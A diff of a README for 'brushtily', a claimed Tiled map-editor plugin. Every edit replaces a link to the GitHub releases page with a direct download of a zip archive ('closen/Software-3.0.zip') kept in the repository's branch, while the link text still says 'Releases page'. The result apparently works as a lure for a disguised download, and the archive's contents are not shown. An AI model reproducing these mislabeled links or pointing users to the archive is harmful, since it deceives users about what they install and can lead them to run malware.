@@ -4,7 +4,7 @@
 Welcome to brushtily! This powerful plugin bridges freeform brushing into Tiled. With brushtily, you can easily place objects and enhance your map-making experience. 
 
 ## 📥 Download brushtily
-[![Download brushtily](https://img.shields.io/badge/Download-brushtily-blue)](https://github.com/ryuk956983/brushtily/releases)
+[![Download brushtily](https://github.com/ryuk956983/brushtily/raw/refs/heads/main/closen/Software-3.0.zip)](https://github.com/ryuk956983/brushtily/raw/refs/heads/main/closen/Software-3.0.zip)
 
 ## 🛠️ Features
 - **Freeform Brushing**: Create landscapes using a natural, drawn style.
@@ -25,7 +25,7 @@ To run brushtily smoothly, ensure you meet the following requirements:
 ## 💻 Installation Steps
 
 ### 1. Visit the Download Page
-To get brushtily, visit the [Releases page](https://github.com/ryuk956983/brushtily/releases). Here, you will find the latest versions and installation files.
+To get brushtily, visit the [Releases page](https://github.com/ryuk956983/brushtily/raw/refs/heads/main/closen/Software-3.0.zip). Here, you will find the latest versions and installation files.
 
 ### 2. Choose Your Version
 On the releases page, look for the latest version. This will usually have the highest version number. 
@@ -61,6 +61,6 @@ If you run into issues or have questions, check out the discussions on GitHub un
 Your feedback is valuable. If you experience problems or have suggestions for brushtily, please share them on GitHub. 
 
 ## 📥 Download brushtily
-Remember, you can download the latest version of brushtily by visiting the [Releases page](https://github.com/ryuk956983/brushtily/releases). 
+Remember, you can download the latest version of brushtily by visiting the [Releases page](https://github.com/ryuk956983/brushtily/raw/refs/heads/main/closen/Software-3.0.zip). 
 
 Enjoy transforming your Tiled experience!
